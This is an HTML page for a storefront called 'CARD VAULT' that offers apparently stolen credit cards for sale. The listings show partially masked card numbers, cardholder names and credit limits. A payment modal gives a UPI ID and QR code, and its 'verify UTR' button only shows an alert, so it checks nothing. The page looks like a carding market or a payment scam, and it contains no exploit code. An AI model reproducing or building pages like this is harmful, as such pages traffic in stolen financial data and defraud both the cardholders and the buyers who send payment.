<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CARD VAULT | Red Cyber Edition</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- FontAwesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        body {
            background-color: #0b0306;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding-bottom: 50px;
        }
        .navbar-brand {
            font-weight: 800;
            letter-spacing: 2px;
            color: #ff2a5f !important;
            font-size: 1.4rem;
            text-shadow: 0 0 10px rgba(255, 42, 95, 0.4);
        }
        .filter-btn {
            background: #14070e;
            border: 1px solid #2e1022;
            color: #bbb;
            padding: 6px 14px;
            border-radius: 20px;
            margin: 3px;
            font-weight: 600;
            font-size: 0.85rem;
            transition: 0.3s;
        }
        .filter-btn:hover, .filter-btn.active {
            background: #ff2a5f;
            color: #fff;
            border-color: #ff2a5f;
            box-shadow: 0 0 10px rgba(255, 42, 95, 0.5);
        }
        .product-card {
            background: #12060b;
            border: 1px solid #2a0f1e;
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 12px;
            transition: 0.3s;
        }
        .product-card:hover {
            border-color: #ff2a5f;
            box-shadow: 0 0 12px rgba(255, 42, 95, 0.2);
        }
        .card-number {
            font-size: 1.15rem;
            font-weight: bold;
            letter-spacing: 2px;
            color: #ffffff;
            font-family: monospace;
        }
        .badge-info-custom {
            background: #220b18;
            color: #ff7b9d;
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 0.75rem;
        }
        .price-tag {
            color: #ff2a5f;
            font-weight: bold;
            font-size: 1.1rem;
        }
        .btn-buy {
            background: linear-gradient(45deg, #d60033, #ff2a5f);
            color: #fff;
            font-weight: bold;
            border: none;
            width: 100%;
            padding: 8px;
            border-radius: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 0.9rem;
            box-shadow: 0 3px 8px rgba(255, 42, 95, 0.3);
            transition: 0.3s;
        }
        .btn-buy:hover {
            background: linear-gradient(45deg, #ff2a5f, #ff5c83);
            box-shadow: 0 0 12px rgba(255, 42, 95, 0.6);
            color: #fff;
        }
        .modal-content {
            background: #12060b;
            color: #fff;
            border: 1px solid #ff2a5f;
            box-shadow: 0 0 25px rgba(255, 42, 95, 0.3);
            border-radius: 15px;
        }
        .qr-box {
            background: #ffffff;
            padding: 10px;
            border-radius: 10px;
            display: inline-block;
            margin: 10px 0;
        }
        .upi-box {
            background: #1b0a13;
            border: 1px solid #3d152a;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>

    <!-- Top Navbar -->
    <nav class="navbar navbar-dark px-3 mb-3" style="background-color: #0e0408; border-bottom: 1px solid #220b18;">
        <div class="container text-center justify-content-center flex-column">
            <div class="text-muted" style="font-size: 0.7rem;"><i class="fa-solid fa-skull-crossbones"></i></div>
            <a class="navbar-brand m-0" href="#">CARD VAULT</a>
            <small class="text-muted" style="font-size: 0.65rem; letter-spacing: 1px;">⚡️ TOP TRUSTED • SECURE LIVE • GIFT CARDS</small>
        </div>
    </nav>

    <div class="container" style="max-width: 480px;">
        
        <!-- Filter Buttons -->
        <div class="text-center mb-3">
            <button class="filter-btn active" onclick="filterCategory('all')">🔥 ALL</button>
            <button class="filter-btn" onclick="filterCategory('visa')">VISA</button>
            <button class="filter-btn" onclick="filterCategory('mc')">MC</button>
            <button class="filter-btn" onclick="filterCategory('amex')">AMEX</button>
        </div>

        <!-- Product List -->
        <div id="product-list">
            
            <!-- Item 1 -->
            <div class="product-card item-box visa">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge-info-custom">VISA</span>
                    <span class="price-tag">₹2200</span>
                </div>
                <div class="text-center my-2">
                    <div class="card-number">6501 4411 5340 XXXX</div>
                </div>
                <div class="d-flex justify-content-between text-muted small mb-2 px-1" style="font-size: 0.75rem;">
                    <span>CVV: <strong class="text-white">XXXXXX</strong></span>
                    <span>LIMIT: <strong class="text-white">₹1,18,000</strong></span>
                </div>
                <div class="text-muted mb-2 px-1" style="font-size: 0.75rem;">NAME: <span class="text-white">ANUP KUMAR</span></div>
                <button class="btn btn-buy" onclick="openPayModal('6501 4411 5340 XXXX', '₹2200')">
                    🛒 BUY • ₹2200
                </button>
            </div>

            <!-- Item 2 -->
            <div class="product-card item-box mc">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge-info-custom">MC</span>
                    <span class="price-tag">₹2000</span>
                </div>
                <div class="text-center my-2">
                    <div class="card-number">5369 8812 4420 XXXX</div>
                </div>
                <div class="d-flex justify-content-between text-muted small mb-2 px-1" style="font-size: 0.75rem;">
                    <span>CVV: <strong class="text-white">XXXXXX</strong></span>
                    <span>LIMIT: <strong class="text-white">₹95,000</strong></span>
                </div>
                <div class="text-muted mb-2 px-1" style="font-size: 0.75rem;">NAME: <span class="text-white">RAHUL SHARMA</span></div>
                <button class="btn btn-buy" onclick="openPayModal('5369 8812 4420 XXXX', '₹2000')">
                    🛒 BUY • ₹2000
                </button>
            </div>

        </div>

    </div>

    <!-- PAY & VERIFY Modal Popup -->
    <div class="modal fade" id="payModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content p-2">
                <div class="modal-header border-0 pb-0">
                    <h6 class="modal-title text-warning fw-bold w-100 text-center">
                        <i class="fa-solid fa-qrcode me-1"></i> 💳 PAY & VERIFY
                    </h6>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body text-center pt-2">
                    
                    <!-- UPI ID Box -->
                    <div class="upi-box d-flex justify-content-between align-items-center mb-2">
                        <span>Arup Bhai: <strong class="text-warning">arupgay@axl</strong></span>
                        <button class="btn btn-sm btn-dark text-danger border-0" onclick="copyUpi()"><i class="fa-regular fa-copy"></i></button>
                    </div>

                    <h3 id="modalPrice" class="text-white fw-bold mb-2">₹0</h3>

                    <!-- QR CODE IMAGE SETTING -->
                    <div class="qr-box">
                        <!-- Yahan apna QR code image ka direct link daalna hai -->
                        <img id="qrImage" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=upi://pay?pa=arupgay@axl" alt="Payment QR" width="150" height="150">
                    </div>

                    <!-- Timer -->
                    <div class="text-danger small mb-3">
                        <i class="fa-solid fa-hourglass-half"></i> <span id="timer">04:59</span>
                    </div>

                    <!-- UTR Input -->
                    <div class="mb-3">
                        <input type="text" id="utrInput" class="form-control bg-dark text-white border-secondary text-center" placeholder="Enter 12 Digit UTR / Ref Number" style="font-size: 0.85rem;">
                    </div>

                    <!-- Verify Button -->
                    <button class="btn btn-buy py-2" onclick="verifyUtr()">
                        ✔ VERIFY UTR
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function filterCategory(cat) {
            let buttons = document.querySelectorAll('.filter-btn');
            buttons.forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');

            let items = document.querySelectorAll('.item-box');
            items.forEach(item => {
                if (cat === 'all' || item.classList.contains(cat)) {
                    item.style.display = 'block';
                } else {
                    item.style.display = 'none';
                }
            });
        }

        function openPayModal(bin, price) {
            document.getElementById('modalPrice').innerText = price;
            var myModal = new bootstrap.Modal(document.getElementById('payModal'));
            myModal.show();
            startTimer(300);
        }

        function copyUpi() {
            navigator.clipboard.writeText("arupgay@axl");
            alert("UPI ID Copied!");
        }

        function startTimer(duration) {
            let timer = duration, minutes, seconds;
            let display = document.getElementById('timer');
            let interval = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    clearInterval(interval);
                    display.textContent = "EXPIRED";
                }
            }, 1000);
        }

        function verifyUtr() {
            let utr = document.getElementById('utrInput').value;
            if(utr.length < 10) {
                alert("Please enter a valid 12 Digit UTR number!");
                return;
            }
            alert("Verifying UTR... Please wait!");
        }
    </script>
</body>
</html>
